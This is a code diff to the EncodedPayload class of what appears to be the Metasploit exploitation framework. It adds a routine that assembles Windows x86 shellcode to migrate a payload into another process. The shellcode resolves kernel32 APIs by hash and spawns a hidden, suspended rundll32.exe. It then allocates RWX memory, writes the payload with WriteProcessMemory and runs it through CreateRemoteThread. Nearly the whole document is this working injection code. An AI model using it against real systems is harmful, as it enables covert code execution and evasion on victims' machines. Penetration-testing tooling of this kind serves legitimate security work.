@@ -88,7 +88,44 @@ class EncodedPayload
 	# raw attribute.
 	#
 	def generate_raw
-		self.raw = (reqs['Prepend'] || '') + pinst.generate + (reqs['Append'] || '')
+		# corelanc0d3r - added migrator routine for win x86
+		# generate payload, we need the len before calling the optional generate_migrator()
+		
+		generated_payload = pinst.generate
+		generated_payload << (reqs['Append'] || '')
+		
+		# do we need to include a migration stub ?
+		
+		migrate_stub = ''
+		
+		if reqs['Migrate'] and reqs['Migrate'].to_s.downcase == "true"
+
+			# only works on win x86 - this would be a good place to check for architecture
+			# defaults
+			delay = 0
+			processname = 'rundll32.exe'
+
+			# get options
+
+			if reqs['MigrateOptions']
+				if reqs['MigrateOptions']['Delay']
+					delay = reqs['MigrateOptions']['Delay'] 
+				end
+		
+				if reqs['MigrateOptions']['Process']
+					processname = reqs['MigrateOptions']['Process'] 
+				end	
+			end
+
+			wlog("Creating migrator stub, process #{processname}, delay #{delay}")
+			
+			migrate_stub = generate_migrator('win','x86',generated_payload.length, processname, delay)
+
+			wlog("Migrator stub generated, #{migrate_stub.length} bytes")
+			
+		end
+		
+		self.raw = (reqs['Prepend'] || '') + migrate_stub + generated_payload
 
 		# If an encapsulation routine was supplied, then we should call it so
 		# that we can get the real raw payload.
@@ -305,6 +342,226 @@ class EncodedPayload
 
 		return self.nop_sled
 	end
+
+	# construct a migrator stub if necessary
+	# corelanc0d3r
+	def generate_migrator(platform, architecture, payloadlen, processname, delay)
+	
+		migrate = ''
+	
+		if platform.downcase == 'win' and architecture.downcase == 'x86'
+	
+			payloadsize = "0x%04x" % payloadlen
+		
+			procname = processname || 'rundll32.exe'
+		
+			delayval = delay || 3
+		
+			delayvalue = "0x%04x" % (delayval * 1000)
+
+			migrate_asm = <<EOS
+add esp,-400		; adjust the stack to avoid corruption
+call main_routine	; start + push address of api_call onto the stack
+
+; block_api code (Stephen Fewer)
+api_call:
+	pushad                 ; We preserve all the registers for the caller, bar EAX and ECX.
+	mov ebp, esp           ; Create a new stack frame
+	xor edx, edx           ; Zero EDX
+	mov edx, fs:[edx+48]   ; Get a pointer to the PEB
+	mov edx, [edx+12]      ; Get PEB->Ldr
+	mov edx, [edx+20]      ; Get the first module from the InMemoryOrder module list
+next_mod:
+	mov esi, [edx+40]      ; Get pointer to modules name (unicode string)
+	movzx ecx, word [edx+38] ; Set ECX to the length we want to check 
+	xor edi, edi           ; Clear EDI which will store the hash of the module name
+loop_modname:            ;
+	xor eax, eax           ; Clear EAX
+	lodsb                  ; Read in the next byte of the name
+	cmp al, 'a'            ; Some versions of Windows use lower case module names
+	jl not_lowercase       ;
+	sub al, 0x20           ; If so normalise to uppercase
+not_lowercase:           ;
+	ror edi, 13            ; Rotate right our hash value
+	add edi, eax           ; Add the next byte of the name
+	loop loop_modname      ; Loop untill we have read enough
+	; We now have the module hash computed
+	push edx               ; Save the current position in the module list for later
+	push edi               ; Save the current module hash for later
+	; Proceed to itterate the export address table, 
+	mov edx, [edx+16]      ; Get this modules base address
+	mov eax, [edx+60]      ; Get PE header
+	add eax, edx           ; Add the modules base address
+	mov eax, [eax+120]     ; Get export tables RVA
+	test eax, eax          ; Test if no export address table is present
+	jz get_next_mod1       ; If no EAT present, process the next module
+	add eax, edx           ; Add the modules base address
+	push eax               ; Save the current modules EAT
+	mov ecx, [eax+24]      ; Get the number of function names  
+	mov ebx, [eax+32]      ; Get the rva of the function names
+	add ebx, edx           ; Add the modules base address
+	; Computing the module hash + function hash
+get_next_func:           ;
+	jecxz get_next_mod     ; When we reach the start of the EAT (we search backwards), process the next module
+	dec ecx                ; Decrement the function name counter
+	mov esi, [ebx+ecx*4]   ; Get rva of next module name
+	add esi, edx           ; Add the modules base address
+	xor edi, edi           ; Clear EDI which will store the hash of the function name
+	; And compare it to the one we want
+loop_funcname:           ;
+	xor eax, eax           ; Clear EAX
+	lodsb                  ; Read in the next byte of the ASCII function name
+	ror edi, 13            ; Rotate right our hash value
+	add edi, eax           ; Add the next byte of the name
+	cmp al, ah             ; Compare AL (the next byte from the name) to AH (null)
+	jne loop_funcname      ; If we have not reached the null terminator, continue
+	add edi, [ebp-8]       ; Add the current module hash to the function hash
+	cmp edi, [ebp+36]      ; Compare the hash to the one we are searchnig for 
+	jnz get_next_func      ; Go compute the next function hash if we have not found it
+	; If found, fix up stack, call the function and then value else compute the next one...
+	pop eax                ; Restore the current modules EAT
+	mov ebx, [eax+36]      ; Get the ordinal table rva      
+	add ebx, edx           ; Add the modules base address
+	mov cx, [ebx+2*ecx]    ; Get the desired functions ordinal
+	mov ebx, [eax+28]      ; Get the function addresses table rva  
+	add ebx, edx           ; Add the modules base address
+	mov eax, [ebx+4*ecx]   ; Get the desired functions RVA
+	add eax, edx           ; Add the modules base address to get the functions actual VA
+	; We now fix up the stack and perform the call to the desired function...
+finish:
+	mov [esp+36], eax      ; Overwrite the old EAX value with the desired api address for the upcoming popad
+	pop ebx                ; Clear off the current modules hash
+	pop ebx                ; Clear off the current position in the module list
+	popad                  ; Restore all of the callers registers, bar EAX, ECX and EDX which are clobbered
+	pop ecx                ; Pop off the origional return address our caller will have pushed
+	pop edx                ; Pop off the hash value our caller will have pushed
+	push ecx               ; Push back the correct return value
+	jmp eax                ; Jump into the required function
+	; We now automagically return to the correct caller...
+get_next_mod:            ;
+	pop eax                ; Pop off the current (now the previous) modules EAT
+get_next_mod1:           ;
+	pop edi                ; Pop off the current (now the previous) modules hash
+	pop edx                ; Restore our position in the module list
+	mov edx, [edx]         ; Get the next module
+	jmp next_mod     ; Process this module
+
+
+; main routine - corelanc0d3r
+main_routine:			; start of main routine
+	pop ebp			; get pointer to api_call
+	; retrieve & build startupinfo at esp+0x60
+	; external/source/shellcode/windows/x86/src/hash.py kernel32.dll GetStartupInfoA
+	; 0xB16B4AB1 = kernel32.dll!GetStartupInfoA
+	mov edx,esp
+	add edx,0x60
+	push edx
+	push 0xB16B4AB1
+	call ebp		; get function pointer + call GetStartupInfoA
+
+	; patch it
+	mov [eax+0x2c],1             ; dwFLags : STARTF_USESHOWWINDOW (0x1)
+	mov [eax+0x30],0             ; wShowWindow : SW_HIDE (0x0)
+
+	; ptr to startupinfo is in eax
+	; pointer to string is in ecx
+	;
+	; create the process
+	; 0x863FCC79 = kernel32.dll!CreateProcessA
+	mov edi,eax
+	add edi,48
+	push edi                      ; lpProcessInformation : write processinfo here
+	push eax                      ; lpStartupInfo : current info (read)
+	xor ebx,ebx
+	push ebx                      ; lpCurrentDirectory
+	push ebx                      ; lpEnvironment
+	push 0x08000004               ; dwCreationFlags CREATE_NO_WINDOW, SUSPENDED
+	push ebx                      ; bInHeritHandles
+	push ebx
+	push ebx
+	jmp get_procname		; will put ptr to command on stack
+get_procname_return:
+	push ebx
+	push 0x863FCC79
+	call ebp
+
+	; sleep, allow process to spawn
+	; 0xE035F044 = kernel32.dll!Sleep
+	push #{delayvalue}
+	push 0xE035F044          
+	call ebp
+
+	; allocate memory in the process (VirtualAllocEx())
+	; 0x3F9287AE = kernel32.dll!VirtualAllocEx
+	; get handle
+	mov ecx,[edi]
+	push 0x40                     ; RWX
+	add bh,0x10
+	push ebx                      ; MEM_COMMIT
+	push ebx                      ; size
+	xor ebx,ebx
+	push ebx                      ; address
+	push ecx                      ; handle
+	push 0x3F9287AE
+	call ebp
+
+	; eax now contains the destination
+	; WriteProcessMemory()
+	; 0xE7BDD8C5 = kernel32.dll!WriteProcessMemory
+	push esp                      ; lpNumberOfBytesWritten 
+	push #{payloadsize}           ; nSize 
+	; pick up pointer to shellcode & keep it on stack (lpBuffer)
+	jmp begin_of_payload
+begin_of_payload_return:
+	push eax                      ; lpBaseAddress 
+	mov ecx,[edi]                 ; pick up handle again
+	push ecx                      ; hProcess 
+	push 0xE7BDD8C5
+	call ebp
+
+	; run the code (CreateRemoteThread())
+	; 0x799AACC6 = kernel32.dll!CreateRemoteThread
+	mov ecx,[edi]                 ; pick up handle again
+	xor ebx,ebx
+	push ebx                      ; lpthreadID
+	push ebx                      ; run immediately
+	push ebx                      ; no parameter
+	mov ebx,[esp-0x4]
+	push ebx                      ; shellcode
+	xor ebx,ebx
+	add bh,0x20
+	push ebx                      ; stacksize
+	xor ebx,ebx
+	push ebx                      ; lpThreadAttributes
+	push ecx
+	push 0x799AACC6	
+	call ebp              ; run staged shellcode
+
+	;sleep
+	push -1
+	push 0xE035F044          
+	call ebp
+
+	;processname
+get_procname:
+	call get_procname_return
+	db "#{procname}"
+	db 0x00
+
+begin_of_payload:
+	call begin_of_payload_return
+
+EOS
+
+			migrate = Metasm::Shellcode.assemble(Metasm::Ia32.new, migrate_asm).encode_string
+											
+		end
+	
+		return migrate
+		
+	end
+
+
 
 
 	#
